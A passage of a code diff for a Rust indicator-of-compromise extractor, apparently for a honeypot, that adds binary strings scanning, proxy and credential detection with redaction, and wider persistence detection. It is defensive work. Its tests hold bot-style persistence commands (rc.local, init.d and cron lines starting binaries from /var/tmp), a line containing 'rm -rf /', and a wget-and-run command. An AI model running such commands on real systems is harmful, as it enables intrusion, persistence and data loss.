@@ -22,7 +22,15 @@
 //!   variable whose name contains `chan`.
 //! - `hosts_entry`: an address and host name pair on a line that writes `/etc/hosts` (a sinkhole).
 //! - `persistence`: cron entries (`@reboot`-style or five time fields), systemd unit names and
-//!   `ExecStart=` lines, and writes to `/etc/rc.local`.
+//!   `ExecStart=` lines, writes to `/etc/rc.local`, lines that create or remove `/etc/init.d`
+//!   scripts, and the `/var/tmp`, `/tmp` or `/dev/shm` drop path such an rc.local or init.d line
+//!   starts (detail `drop path`). A `%s` template, as a binary carries it before filling in its
+//!   own name, is kept as written.
+//!
+//! A captured artifact that is not small UTF-8 text (a compiled bot) is scanned through its
+//! printable strings, the way `strings -a` lists them: runs of at least [`MIN_STRING_LEN`]
+//! printable ASCII bytes from the first [`MAX_BINARY_SCAN_BYTES`] bytes, at most
+//! [`MAX_STRINGS_TEXT_BYTES`] of them, each run on its own line.
 
 use std::collections::HashSet;
 use std::net::Ipv4Addr;
@@ -40,8 +48,15 @@ pub const MAX_IOCS_PER_COMMAND: usize = 16;
 pub const MAX_IOC_VALUE_BYTES: usize = 256;
 /// Longest stored detail, in bytes, after sanitization.
 pub const MAX_IOC_DETAIL_BYTES: usize = 128;
-/// Largest artifact scanned. A dropper or unit file is a few KB; this also bounds the scan.
+/// Largest artifact scanned as text, and the size of each piece of strings text scanned. A dropper
+/// or unit file is a few KB; this also bounds each scan.
 pub const MAX_ARTIFACT_TEXT_BYTES: usize = 64 * 1024;
+/// Largest artifact read for its printable strings: a compiled bot is tens of KB to a few MB.
+pub const MAX_BINARY_SCAN_BYTES: usize = 8 * 1024 * 1024;
+/// Shortest printable run kept as a string.
+pub const MIN_STRING_LEN: usize = 6;
+/// Most strings text kept from one binary.
+pub const MAX_STRINGS_TEXT_BYTES: usize = 256 * 1024;
 /// Longest cron or rc.local line kept as a persistence value, in characters, before the byte cap.
 const MAX_PERSISTENCE_LINE_CHARS: usize = 200;
 
@@ -56,10 +71,12 @@ pub enum IocKind {
     IrcChannel,
     HostsEntry,
     Persistence,
+    Proxy,
+    Credentials,
 }
 
 impl IocKind {
-    pub const ALL: [IocKind; 9] = [
+    pub const ALL: [IocKind; 11] = [
         IocKind::Url,
         IocKind::Endpoint,
         IocKind::SshKey,
@@ -69,6 +86,8 @@ impl IocKind {
         IocKind::IrcChannel,
         IocKind::HostsEntry,
         IocKind::Persistence,
+        IocKind::Proxy,
+        IocKind::Credentials,
     ];
 
     /// The stored `ioc.kind` value (migration 0015's CHECK list).
@@ -83,6 +102,8 @@ impl IocKind {
             IocKind::IrcChannel => "irc_channel",
             IocKind::HostsEntry => "hosts_entry",
             IocKind::Persistence => "persistence",
+            IocKind::Proxy => "proxy",
+            IocKind::Credentials => "credentials",
         }
     }
 
@@ -102,6 +123,8 @@ impl IocKind {
             IocKind::IrcChannel => "IRC channel",
             IocKind::HostsEntry => "hosts entry",
             IocKind::Persistence => "persistence",
+            IocKind::Proxy => "proxy",
+            IocKind::Credentials => "embedded credentials",
         }
     }
 }
@@ -137,14 +160,81 @@ pub fn looks_like_text(bytes: &[u8]) -> bool {
     controls * 50 <= total
 }
 
-/// The indicators in a captured artifact, or `None` when it is not text or is larger than
-/// [`MAX_ARTIFACT_TEXT_BYTES`].
-pub fn extract_from_artifact(bytes: &[u8]) -> Option<Vec<Indicator>> {
-    if bytes.len() > MAX_ARTIFACT_TEXT_BYTES || !looks_like_text(bytes) {
+/// How an artifact was read for indicators.
+#[derive(Debug, Clone, Copy, PartialEq, Eq)]
+pub enum ArtifactRead {
+    /// Small UTF-8 text, scanned whole.
+    Text,
+    /// Anything else, scanned through its printable strings.
+    Strings,
+}
+
+/// The printable strings of `bytes` as `strings -a` lists them: runs of at least `min` bytes that
+/// are printable ASCII or tab, one per line, at most `max_out` bytes in all.
+pub fn printable_strings(bytes: &[u8], min: usize, max_out: usize) -> String {
+    let mut out = String::new();
+    let mut start = None;
+    for (i, &b) in bytes.iter().chain(std::iter::once(&0)).enumerate() {
+        if (0x20..=0x7e).contains(&b) || b == b'\t' {
+            start.get_or_insert(i);
+            continue;
+        }
+        if let Some(s) = start.take()
+            && i - s >= min
+        {
+            let run = &bytes[s..i];
+            if out.len() + run.len() + 1 > max_out {
+                break;
+            }
+            // Every byte of the run is ASCII, so this never replaces anything.
+            out.push_str(&String::from_utf8_lossy(run));
+            out.push('\n');
+        }
+    }
+    out
+}
+
+/// The text an artifact is scanned as, or `None` when it is larger than
+/// [`MAX_BINARY_SCAN_BYTES`].
+pub fn artifact_text(bytes: &[u8]) -> Option<(ArtifactRead, String)> {
+    if bytes.len() <= MAX_ARTIFACT_TEXT_BYTES
+        && looks_like_text(bytes)
+        && let Ok(text) = std::str::from_utf8(bytes)
+    {
+        return Some((ArtifactRead::Text, text.to_string()));
+    }
+    if bytes.len() > MAX_BINARY_SCAN_BYTES {
         return None;
     }
-    let text = std::str::from_utf8(bytes).ok()?;
-    Some(extract(text, MAX_IOCS_PER_ARTIFACT))
+    Some((
+        ArtifactRead::Strings,
+        printable_strings(bytes, MIN_STRING_LEN, MAX_STRINGS_TEXT_BYTES),
+    ))
+}
+
+/// The indicators in a captured artifact and how it was read, or `None` when it is larger than
+/// [`MAX_BINARY_SCAN_BYTES`].
+pub fn extract_from_artifact(bytes: &[u8]) -> Option<(ArtifactRead, Vec<Indicator>)> {
+    let (read, text) = artifact_text(bytes)?;
+    Some((read, extract_artifact_text(&text)))
+}
+
+/// The indicators in an artifact's text as [`artifact_text`] produced it, at most
+/// [`MAX_IOCS_PER_ARTIFACT`].
+pub fn extract_artifact_text(text: &str) -> Vec<Indicator> {
+    let mut out = Collector::new(MAX_IOCS_PER_ARTIFACT);
+    // Strings text can exceed one scan's size; it is scanned a line-aligned piece at a time.
+    let mut rest = text;
+    while !rest.is_empty() && !out.full() {
+        let piece = truncate(rest, MAX_ARTIFACT_TEXT_BYTES);
+        let piece = match piece.len() < rest.len() {
+            true => piece.rfind('\n').map_or(piece, |nl| &piece[..=nl]),
+            false => piece,
+        };
+        scan_into(piece, &mut out);
+        rest = &rest[piece.len().max(1).min(rest.len())..];
+    }
+    out.items
 }
 
 /// The indicators in one command line.
@@ -167,17 +257,21 @@ pub fn self_propagating(text: &str) -> bool {
 /// Every indicator in `text`, at most `cap`, the highest-value kinds first so a crafted flood of
 /// URLs cannot push a planted key out of the result.
 pub fn extract(text: &str, cap: usize) -> Vec<Indicator> {
-    let text = truncate(text, MAX_ARTIFACT_TEXT_BYTES);
     let mut out = Collector::new(cap);
-    ssh_keys(text, &mut out);
-    pem_keys(text, &mut out);
-    password_hashes(text, &mut out);
-    hosts_entries(text, &mut out);
-    irc(text, &mut out);
-    persistence(text, &mut out);
-    urls(text, &mut out);
-    endpoints(text, &mut out);
+    scan_into(truncate(text, MAX_ARTIFACT_TEXT_BYTES), &mut out);
     out.items
+}
+
+fn scan_into(text: &str, out: &mut Collector) {
+    ssh_keys(text, out);
+    pem_keys(text, out);
+    password_hashes(text, out);
+    hosts_entries(text, out);
+    irc(text, out);
+    persistence(text, out);
+    proxy(text, out);
+    urls(text, out);
+    endpoints(text, out);
 }
 
 struct Collector {
@@ -203,16 +297,69 @@ impl Collector {
         if self.full() {
             return;
         }
-        let value = sanitize_field(value, MAX_IOC_VALUE_BYTES);
+        let value = sanitize_field(&redact_secrets(value), MAX_IOC_VALUE_BYTES);
         if value.is_empty() || !self.seen.insert((kind, value.clone())) {
             return;
         }
         self.items.push(Indicator {
             kind,
             value,
-            detail: sanitize_field(detail, MAX_IOC_DETAIL_BYTES),
+            detail: sanitize_field(&redact_secrets(detail), MAX_IOC_DETAIL_BYTES),
         });
     }
+}
+
+/// The text that stands in for a removed secret.
+const REDACTED: &str = "<redacted>";
+
+/// `text` with the secrets a kept line can carry replaced by [`REDACTED`]: the user information of
+/// every `scheme://user:pass@host`, and the value after an `Authorization:` or
+/// `Proxy-Authorization:` scheme. A `%s`-style template value is not a secret and is kept.
+pub fn redact_secrets(text: &str) -> String {
+    let ends_authority = |c: char| c == '/' || c.is_whitespace() || "'\"`".contains(c);
+    let mut out = text.to_string();
+    let mut from = 0;
+    while let Some(rel) = out.get(from..).and_then(|s| s.find("://")) {
+        let start = from + rel + 3;
+        let end = out[start..]
+            .find(ends_authority)
+            .map_or(out.len(), |e| start + e);
+        match out[start..end].rfind('@') {
+            Some(at) => {
+                out.replace_range(start..start + at, REDACTED);
+                from = start + REDACTED.len() + 1;
+            }
+            None => from = end,
+        }
+    }
+    let mut from = 0;
+    loop {
+        // ASCII lowercasing keeps every byte offset, so positions carry over to `out`.
+        let lower = out.to_ascii_lowercase();
+        let Some(rel) = lower.get(from..).and_then(|s| s.find("authorization:")) else {
+            break;
+        };
+        let after = from + rel + "authorization:".len();
+        let rest = &out[after..];
+        let scheme_start = rest.len() - rest.trim_start().len();
+        let scheme_len = rest[scheme_start..]
+            .find(char::is_whitespace)
+            .unwrap_or(rest.len() - scheme_start);
+        let value_at = scheme_start + scheme_len;
+        let value_start = value_at + (rest[value_at..].len() - rest[value_at..].trim_start().len());
+        let value_len = rest[value_start..]
+            .find(|c: char| c.is_whitespace() || "'\"\\".contains(c))
+            .unwrap_or(rest.len() - value_start);
+        let value = &rest[value_start..value_start + value_len];
+        if value.is_empty() || value.starts_with('%') {
+            from = after;
+            continue;
+        }
+        let (a, b) = (after + value_start, after + value_start + value_len);
+        out.replace_range(a..b, REDACTED);
+        from = a + REDACTED.len();
+    }
+    out
 }
 
 fn truncate(text: &str, max: usize) -> &str {
@@ -537,11 +684,47 @@ fn is_cron_field(w: &str) -> bool {
     !w.is_empty() && w.chars().all(|c| c.is_ascii_digit() || "*/,-".contains(c))
 }
 
+/// Shell operations that write a file, for telling a write to a startup file from a read of it.
+const WRITE_OPS: [&str; 6] = ["echo", ">>", "> ", "sed ", "tee", "printf"];
+
+/// Shell startup files whose appended line runs at every login.
+const SHELL_PROFILES: [&str; 5] = [
+    ".bashrc",
+    ".bash_profile",
+    ".profile",
+    "/etc/profile",
+    ".zshrc",
+];
+
+/// Directories a dropper copies its binary into: the world-writable ones, and the system
+/// directories it hides among.
+const DROP_DIRS: [&str; 10] = [
+    "/var/tmp/",
+    "/dev/shm/",
+    "/tmp/",
+    "/usr/lib/",
+    "/usr/bin/",
+    "/usr/sbin/",
+    "/usr/local/bin/",
+    "/lib/",
+    "/bin/",
+    "/sbin/",
+];
+
 fn persistence(text: &str, out: &mut Collector) {
     for line in text.lines() {
+        let w = words(line);
+        // Each line that is a persistence step also contributes the drop path it starts.
+        let step = |out: &mut Collector, value: &str, detail: &str| {
+            out.push(IocKind::Persistence, value, detail);
+            for path in drop_paths(line) {
+                out.push(IocKind::Persistence, path, "drop path");
+            }
+        };
+
         for special in CRON_SPECIALS {
             if let Some(at) = line.find(special) {
-                out.push(IocKind::Persistence, &clause_from(line, at), "cron");
+                step(out, &clause_from(line, at), "cron");
             }
         }
         let trimmed = line.trim_start();
@@ -550,53 +733,157 @@ fn persistence(text: &str, out: &mut Collector) {
             && fields[..5].iter().all(|f| is_cron_field(f))
             && fields[..5].iter().any(|f| f.contains('*'))
         {
-            out.push(IocKind::Persistence, &clause_from(trimmed, 0), "cron");
-        } else if line.contains("cron") {
-            let w = words(line);
-            if let Some(i) = w.windows(6).position(|f| {
+            step(out, &clause_from(trimmed, 0), "cron");
+        } else if line.contains("cron")
+            && let Some(i) = w.windows(6).position(|f| {
                 f[..5].iter().all(|x| is_cron_field(x)) && f[..5].iter().any(|x| x.contains('*'))
-            }) {
-                // Each word is a slice of `line`, so its offset is exact; searching for its text
-                // would find an earlier occurrence of a short field such as `0`.
-                let at = w[i].as_ptr() as usize - line.as_ptr() as usize;
-                out.push(IocKind::Persistence, &clause_from(line, at), "cron");
-            }
+            })
+        {
+            // Each word is a slice of `line`, so its offset is exact; searching for its text
+            // would find an earlier occurrence of a short field such as `0`.
+            let at = w[i].as_ptr() as usize - line.as_ptr() as usize;
+            step(out, &clause_from(line, at), "cron");
         }
-        if let Some(exec) = trimmed.strip_prefix("ExecStart=") {
-            out.push(
-                IocKind::Persistence,
-                &format!(
-                    "ExecStart={}",
-                    exec.chars()
-                        .take(MAX_PERSISTENCE_LINE_CHARS)
-                        .collect::<String>()
-                ),
-                "systemd",
-            );
+        let cron_file = ["/etc/crontab", "/etc/cron.d/", "/var/spool/cron"]
+            .iter()
+            .any(|f| line.contains(f));
+        if cron_file && WRITE_OPS.iter().any(|op| line.contains(op)) {
+            step(out, &whole(line), "cron");
         }
-        for word in words(line) {
+
+        // A unit file written line by line, or built in one printf string with `\n` escapes.
+        for (at, _) in line.match_indices("ExecStart=") {
+            let value = &line[at..];
+            let end = [value.find("\\n"), value.find(['"', '\''])]
+                .into_iter()
+                .flatten()
+                .min()
+                .unwrap_or(value.len());
+            step(out, &whole(&value[..end]), "systemd");
+        }
+        for word in &w {
             let name = word.rsplit('/').next().unwrap_or(word);
-            if name.len() > ".service".len()
-                && name.ends_with(".service")
-                && name
-                    .chars()
-                    .all(|c| c.is_ascii_alphanumeric() || "@._-".contains(c))
-            {
+            if name.len() > ".service".len() && name.ends_with(".service") && is_unit_name(name) {
                 out.push(IocKind::Persistence, &format!("unit {name}"), "systemd");
             }
         }
-        if line.contains("/etc/rc.local")
-            && ["echo", ">>", "sed ", "tee", "printf"]
-                .iter()
-                .any(|op| line.contains(op))
+        if let Some(s) = w.iter().position(|x| *x == "systemctl")
+            && let Some(e) = w[s..].iter().position(|x| *x == "enable")
+            && let Some(name) = w[s + e + 1..].iter().find(|x| !x.starts_with('-'))
+            && is_unit_name(name)
         {
-            let kept: String = line
-                .trim()
-                .chars()
-                .take(MAX_PERSISTENCE_LINE_CHARS)
-                .collect();
-            out.push(IocKind::Persistence, &kept, "rc.local");
+            out.push(IocKind::Persistence, &format!("unit {name}"), "systemd");
         }
+
+        let rc_local =
+            line.contains("/etc/rc.local") && WRITE_OPS.iter().any(|op| line.contains(op));
+        if rc_local {
+            step(out, &whole(line), "rc.local");
+        } else if line.contains("/etc/init.d/") {
+            step(out, &whole(line), "init.d");
+        }
+        if SHELL_PROFILES.iter().any(|p| line.contains(p))
+            && WRITE_OPS.iter().any(|op| line.contains(op))
+        {
+            step(out, &whole(line), "shell profile");
+        }
+        if let Some(c) = w.iter().position(|x| *x == "chattr")
+            && w[c + 1..]
+                .iter()
+                .any(|x| x.starts_with('+') && x.contains(['i', 'a']))
+        {
+            step(out, &whole(line), "chattr");
+        }
+        for path in copy_destinations(line) {
+            out.push(IocKind::Persistence, path, "drop path");
+        }
+    }
+}
+
+/// A line kept as a persistence value: trimmed and shortened.
+fn whole(line: &str) -> String {
+    line.trim()
+        .chars()
+        .take(MAX_PERSISTENCE_LINE_CHARS)
+        .collect()
+}
+
+/// A systemd unit name, or a `%s` template of one.
+fn is_unit_name(name: &str) -> bool {
+    !name.is_empty()
+        && name.len() <= 128
+        && name
+            .chars()
+            .all(|c| c.is_ascii_alphanumeric() || "@._-%".contains(c))
+}
+
+/// Where `cp`, `mv` or `install` puts a file, when that is a file in one of [`DROP_DIRS`]: the
+/// last word of each such command, in each `;`, `&&`, `||` or `|` separated part of the line.
+fn copy_destinations(line: &str) -> Vec<&str> {
+    let mut found = Vec::new();
+    for part in line.split([';', '|', '&']) {
+        let w: Vec<&str> = part.split_whitespace().collect();
+        let Some(cmd) = w.iter().position(|x| {
+            let name = x.rsplit('/').next().unwrap_or(x);
+            matches!(name, "cp" | "mv" | "install")
+        }) else {
+            continue;
+        };
+        let Some(dest) = w.last().filter(|_| w.len() > cmd + 2) else {
+            continue;
+        };
+        let dest = dest.trim_matches(['\'', '"']);
+        if let Some(dir) = DROP_DIRS.iter().find(|d| dest.starts_with(*d))
+            && dest.len() > dir.len()
+            && !dest.ends_with('/')
+        {
+            found.push(dest);
+        }
+    }
+    found
+}
+
+/// The world-writable drop locations a persistence line names (`/var/tmp/x`, `/tmp/x`,
+/// `/dev/shm/x`, or a `%s` template of one), each up to the first character that ends a shell word.
+fn drop_paths(line: &str) -> Vec<&str> {
+    let mut found = Vec::new();
+    for prefix in ["/var/tmp/", "/dev/shm/", "/tmp/"] {
+        for (at, _) in line.match_indices(prefix) {
+            // `/tmp/` inside `/var/tmp/` is the same path, already taken.
+            if prefix == "/tmp/" && line[..at].ends_with("/var") {
+                continue;
+            }
+            let rest = &line[at..];
+            let end = rest
+                .find(|c: char| c.is_whitespace() || "'\"&;|<>`\\)".contains(c))
+                .unwrap_or(rest.len());
+            if end > prefix.len() {
+                found.push(&rest[..end]);
+            }
+        }
+    }
+    found
+}
+
+/// The value recorded when credentials are found: which mechanism carried them, never what they
+/// were.
+const CREDENTIALS_DETAIL: &str = "present; the value is not stored";
+
+/// `url` with any user name and password removed, and whether there were any. A URL that does not
+/// parse but has an `@` in it is withheld entirely (`None`), since what precedes the `@` may be a
+/// password.
+pub fn redact_url_credentials(url: &str) -> (Option<String>, bool) {
+    match url::Url::parse(url) {
+        Ok(mut parsed) => {
+            let had = !parsed.username().is_empty() || parsed.password().is_some();
+            if had {
+                let _ = parsed.set_username("");
+                let _ = parsed.set_password(None);
+            }
+            (Some(parsed.to_string()), had)
+        }
+        Err(_) if url.contains('@') => (None, true),
+        Err(_) => (Some(url.to_string()), false),
     }
 }
 
@@ -604,7 +891,18 @@ fn urls(text: &str, out: &mut Collector) {
     if out.full() {
         return;
     }
-    for url in crate::fetcher::extract::extract_urls(text.as_bytes()) {
+    for raw in crate::fetcher::extract::extract_urls(text.as_bytes()) {
+        let (url, had_credentials) = redact_url_credentials(&raw);
+        if had_credentials {
+            out.push(
+                IocKind::Credentials,
+                "URL user information",
+                CREDENTIALS_DETAIL,
+            );
+        }
+        let Some(url) = url else {
+            continue;
+        };
         let detail = url::Url::parse(&url)
             .ok()
             .and_then(|u| {
@@ -616,6 +914,124 @@ fn urls(text: &str, out: &mut Collector) {
             })
             .unwrap_or_default();
         out.push(IocKind::Url, &url, &detail);
+    }
+}
+
+/// Words in a host name that mark it as a proxy gateway.
+const PROXY_HOST_MARKERS: [&str; 5] = ["proxy", "gw", "gate", "tunnel", "socks"];
+
+/// File extensions a binary's strings end names with, which would otherwise read as top-level
+/// labels (`proxy.conf`, `gateway.sh`).
+const FILE_EXTENSIONS: [&str; 22] = [
+    "sh", "conf", "cfg", "ini", "so", "py", "pl", "txt", "log", "json", "xml", "yml", "yaml",
+    "service", "pid", "tmp", "bin", "out", "lock", "sock", "dat", "rc",
+];
+
+/// A host name with an alphabetic top-level label that is not a file extension, so a library or
+/// file name such as `libc.so.6` or `proxy.conf` is not one.
+fn is_named_host(s: &str) -> bool {
+    is_hostname(s)
+        && s.rsplit('.').next().is_some_and(|tld| {
+            tld.len() >= 2
+                && tld.chars().all(|c| c.is_ascii_alphabetic())
+                && !FILE_EXTENSIONS.contains(&tld.to_ascii_lowercase().as_str())
+        })
+}
+
+/// A bot that relays through, or sells access to, an HTTP proxy: the `CONNECT` request template,
+/// the proxy gateway host names it names, and whether it embeds the credentials for them. A
+/// credential value is never recorded, only that one is there and how it is carried.
+fn proxy(text: &str, out: &mut Collector) {
+    let lower = text.to_ascii_lowercase();
+    let connect = text.contains("CONNECT ") && text.contains("HTTP/1.");
+    if !connect && !lower.contains("proxy") {
+        return;
+    }
+    for line in text.lines() {
+        if let Some(at) = line.find("CONNECT ")
+            && line[at..].contains("HTTP/1.")
+        {
+            let request = &line[at..];
+            let end = [
+                request.find("\\r"),
+                request.find("\\n"),
+                request.find(['"', '\'']),
+            ]
+            .into_iter()
+            .flatten()
+            .min()
+            .unwrap_or(request.len());
+            let detail = if request[..end].contains('%') {
+                "CONNECT template"
+            } else {
+                "CONNECT request"
+            };
+            out.push(IocKind::Proxy, &whole(&request[..end]), detail);
+        }
+        let lower_line = line.to_ascii_lowercase();
+        if let Some(at) = lower_line.find("proxy-authorization:") {
+            let header = &line[at + "proxy-authorization:".len()..];
+            let mut parts = header.split_whitespace();
+            let scheme = parts.next().unwrap_or_default();
+            let value = parts.next().unwrap_or_default();
+            if value.starts_with('%') {
+                // A format template: no credential in it, and its scheme is worth knowing.
+                out.push(
+                    IocKind::Proxy,
+                    &format!("Proxy-Authorization: {} %s", scheme_name(scheme)),
+                    "authorization template",
+                );
+            } else if !value.is_empty() {
+                out.push(
+                    IocKind::Credentials,
+                    &format!("Proxy-Authorization {}", scheme_name(scheme)),
+                    CREDENTIALS_DETAIL,
+                );
+            }
+        }
+        for word in words(line) {
+            let bare = word.split_once("://").map_or(word, |(_, rest)| rest);
+            let bare = bare.split('/').next().unwrap_or(bare);
+            // `user:pass@host:port`, the way a proxy URL or a proxy list carries its login.
+            let host_part = match bare.rsplit_once('@') {
+                Some((userinfo, host)) if userinfo.contains(':') => {
+                    let (h, _) = host.rsplit_once(':').unwrap_or((host, ""));
+                    if is_named_host(h) || h.parse::<Ipv4Addr>().is_ok() {
+                        out.push(
+                            IocKind::Credentials,
+                            "proxy user information",
+                            CREDENTIALS_DETAIL,
+                        );
+                    }
+                    host
+                }
+                Some(_) => continue,
+                None => bare,
+            };
+            let (host, port) = match host_part.rsplit_once(':') {
+                Some((h, p)) if p.parse::<u16>().is_ok() => (h, Some(p)),
+                _ => (host_part, None),
+            };
+            let host_lower = host.to_ascii_lowercase();
+            if is_named_host(host) && PROXY_HOST_MARKERS.iter().any(|m| host_lower.contains(m)) {
+                let value = match port {
+                    Some(p) => format!("{host}:{p}"),
+                    None => host.to_string(),
+                };
+                out.push(IocKind::Proxy, &value, "proxy gateway");
+            }
+        }
+    }
+}
+
+/// An HTTP authorization scheme name, or `?` for anything that is not one.
+fn scheme_name(scheme: &str) -> &'static str {
+    match scheme.to_ascii_lowercase().as_str() {
+        "basic" => "Basic",
+        "bearer" => "Bearer",
+        "digest" => "Digest",
+        "negotiate" => "Negotiate",
+        _ => "?",
     }
 }
 
@@ -692,7 +1108,8 @@ Jx4u80n/q0WquQbw1QIDAQAB
 
     #[test]
     fn the_worm_script_yields_every_indicator_kind_it_carries() {
-        let found = extract_from_artifact(worm_script().as_bytes()).expect("text");
+        let (read, found) = extract_from_artifact(worm_script().as_bytes()).expect("text");
+        assert_eq!(read, ArtifactRead::Text);
         assert_eq!(of(IocKind::SshKey, &found), vec![RSA_FP.to_string()]);
         let key = found.iter().find(|i| i.kind == IocKind::SshKey).unwrap();
         assert_eq!(key.detail, "ssh-rsa, comment fixture-implant");
@@ -767,7 +1184,7 @@ Jx4u80n/q0WquQbw1QIDAQAB
     #[test]
     fn the_w_sh_campaign_persistence_lines_are_found() {
         let unit = "[Unit]\nDescription=watcher\n[Service]\nExecStart=/home/developer/.config/netai -c conf\nRestart=always\n";
-        let found = extract_from_artifact(unit.as_bytes()).unwrap();
+        let (_, found) = extract_from_artifact(unit.as_bytes()).unwrap();
         assert_eq!(
             of(IocKind::Persistence, &found),
             vec!["ExecStart=/home/developer/.config/netai -c conf".to_string()]
@@ -813,13 +1230,15 @@ Jx4u80n/q0WquQbw1QIDAQAB
         let crafted = "echo \"@reboot /tmp/\u{1b}[31mred\u{202e}evil\r\nrm -rf /\" | crontab -";
         let found = extract_from_command(crafted);
         let p = of(IocKind::Persistence, &found);
-        assert_eq!(p.len(), 1, "{found:?}");
-        for c in p[0].chars() {
-            assert!(
-                !c.is_control() && c != '\u{202e}',
-                "unsanitized {c:?} in {:?}",
-                p[0]
-            );
+        // The cron entry and the drop path it starts.
+        assert_eq!(p.len(), 2, "{found:?}");
+        for value in &p {
+            for c in value.chars() {
+                assert!(
+                    !c.is_control() && c != '\u{202e}',
+                    "unsanitized {c:?} in {value:?}"
+                );
+            }
         }
         let long = format!("echo \"@reboot /tmp/{}\" | crontab -", "a".repeat(5000));
         for i in extract_from_command(&long) {
@@ -840,12 +1259,286 @@ Jx4u80n/q0WquQbw1QIDAQAB
         assert_eq!(found[0].kind, IocKind::SshKey);
     }
 
+    /// The persistence templates a captured bot carried in its strings, before it fills in its own
+    /// name (synthetic names; the forms are the observed ones).
+    const RC_LOCAL_TEMPLATE: &str = "grep -q '%s' /etc/rc.local 2>/dev/null || sed -i '/^exit 0/i /var/tmp/%s &' /etc/rc.local 2>/dev/null";
+    const INIT_D_TEMPLATE: &str = "printf '#!/bin/sh\\n/var/tmp/%s &\\n' > /etc/init.d/%s 2>/dev/null && chmod +x /etc/init.d/%s 2>/dev/null";
+    const INIT_D_REMOVE_TEMPLATE: &str = "rm -f /etc/init.d/%s";
+
+    /// A synthetic ELF-shaped body: binary noise around the strings, as `strings -a` sees a bot.
+    fn bot_binary(strings: &[&str]) -> Vec<u8> {
+        let mut body = b"\x7fELF\x02\x01\x01\0\0\0\0\0\0\0\0\0\x02\0\x3e\0".to_vec();
+        for s in strings {
+            body.extend_from_slice(&[0x00, 0x8f, 0xc3, 0x01]);
+            body.extend_from_slice(s.as_bytes());
+            body.push(0);
+        }
+        // Short printable runs are noise and are not kept.
+        body.extend_from_slice(b"\x90abc\x00\xffxy\x00");
+        body
+    }
+
+    fn persistence_of(found: &[Indicator]) -> Vec<(String, String)> {
+        found
+            .iter()
+            .filter(|i| i.kind == IocKind::Persistence)
+            .map(|i| (i.value.clone(), i.detail.clone()))
+            .collect()
+    }
+
     #[test]
-    fn binary_and_oversized_bodies_are_not_scanned() {
-        assert!(extract_from_artifact(b"\x7fELF\x02\x01\x01\0\0\0").is_none());
-        assert!(extract_from_artifact(&vec![b'a'; MAX_ARTIFACT_TEXT_BYTES + 1]).is_none());
-        assert!(extract_from_artifact(b"#!/bin/sh\necho hi\n").is_some());
+    fn a_binarys_persistence_templates_are_read_from_its_strings() {
+        let body = bot_binary(&[RC_LOCAL_TEMPLATE, INIT_D_TEMPLATE, INIT_D_REMOVE_TEMPLATE]);
+        let (read, found) = extract_from_artifact(&body).expect("scanned");
+        assert_eq!(read, ArtifactRead::Strings);
+        let p = persistence_of(&found);
+        let expect = |value: &str, detail: &str| (value.to_string(), detail.to_string());
+        assert!(p.contains(&expect(RC_LOCAL_TEMPLATE, "rc.local")), "{p:?}");
+        assert!(p.contains(&expect(INIT_D_TEMPLATE, "init.d")), "{p:?}");
+        assert!(
+            p.contains(&expect(INIT_D_REMOVE_TEMPLATE, "init.d")),
+            "{p:?}"
+        );
+        assert!(p.contains(&expect("/var/tmp/%s", "drop path")), "{p:?}");
+        assert_eq!(
+            p.len(),
+            4,
+            "the drop path is one indicator however often it recurs: {p:?}"
+        );
+    }
+
+    #[test]
+    fn filled_in_persistence_names_its_drop_path_in_scripts_and_commands() {
+        let script = "#!/bin/sh\n\
+                      cp $0 /var/tmp/fixturebot\n\
+                      grep -q 'fixturebot' /etc/rc.local || sed -i '/^exit 0/i /var/tmp/fixturebot &' /etc/rc.local\n\
+                      printf '#!/bin/sh\\n/var/tmp/fixturebot &\\n' > /etc/init.d/fixturebot && chmod +x /etc/init.d/fixturebot\n";
+        let (read, found) = extract_from_artifact(script.as_bytes()).unwrap();
+        assert_eq!(read, ArtifactRead::Text);
+        let p = persistence_of(&found);
+        assert!(
+            p.contains(&("/var/tmp/fixturebot".to_string(), "drop path".to_string())),
+            "{p:?}"
+        );
+        assert_eq!(
+            p.iter().filter(|(_, d)| d == "rc.local").count(),
+            1,
+            "{p:?}"
+        );
+        assert_eq!(p.iter().filter(|(_, d)| d == "init.d").count(), 1, "{p:?}");
+        // The `cp` line drops the file but is not persistence, so it adds nothing of its own.
+        assert_eq!(p.len(), 3, "{p:?}");
+
+        let cmd = "rm -f /etc/init.d/fixturebot; echo '/dev/shm/.fx &' >> /etc/rc.local";
+        let p = persistence_of(&extract_from_command(cmd));
+        assert!(
+            p.contains(&("/dev/shm/.fx".to_string(), "drop path".to_string())),
+            "{p:?}"
+        );
+        assert!(p.iter().any(|(v, d)| d == "rc.local" && v == cmd), "{p:?}");
+    }
+
+    #[test]
+    fn strings_are_runs_of_printable_bytes_like_strings_a() {
+        let body = b"\x00ab\x00abcdef\x01\tline two\xff\x7fxyzxyz";
+        assert_eq!(
+            printable_strings(body, 6, 1024),
+            "abcdef\n\tline two\nxyzxyz\n"
+        );
+        // The output bound holds: a run that would pass it ends the listing.
+        assert_eq!(printable_strings(body, 6, 10), "abcdef\n");
+    }
+
+    #[test]
+    fn oversized_bodies_are_not_scanned_and_text_is_read_whole() {
+        assert!(extract_from_artifact(&vec![0u8; MAX_BINARY_SCAN_BYTES + 1]).is_none());
+        // Text past the text size is read through its strings instead of being refused.
+        let (read, _) = extract_from_artifact(&vec![b'a'; MAX_ARTIFACT_TEXT_BYTES + 1]).unwrap();
+        assert_eq!(read, ArtifactRead::Strings);
+        let (read, _) = extract_from_artifact(b"#!/bin/sh\necho hi\n").unwrap();
+        assert_eq!(read, ArtifactRead::Text);
         assert!(!self_propagating("wget http://198.51.100.1/x; sh x"));
+    }
+
+    #[test]
+    fn strings_text_larger_than_one_scan_is_scanned_piece_by_piece() {
+        // About 160 KB of strings: past one 64 KB scan, inside the strings bound.
+        let filler: Vec<String> = (0..8_000).map(|i| format!("padding-string-{i}")).collect();
+        let mut strings: Vec<&str> = filler.iter().map(String::as_str).collect();
+        strings.push(INIT_D_REMOVE_TEMPLATE);
+        let (_, text) = artifact_text(&bot_binary(&strings)).unwrap();
+        assert!(text.len() > 2 * MAX_ARTIFACT_TEXT_BYTES && text.len() < MAX_STRINGS_TEXT_BYTES);
+        let found = extract_artifact_text(&text);
+        assert!(
+            persistence_of(&found)
+                .iter()
+                .any(|(v, _)| v == INIT_D_REMOVE_TEMPLATE),
+            "a string past the first scan's size was missed"
+        );
+    }
+
+    /// The persistence and proxy strings of a captured bot (the owner examined one), with
+    /// synthetic names and documentation hosts, as its binary carries them before filling in
+    /// `%s`. Line ends inside a C string are real CR and LF bytes, which end a printable run.
+    fn bot_strings() -> Vec<&'static str> {
+        vec![
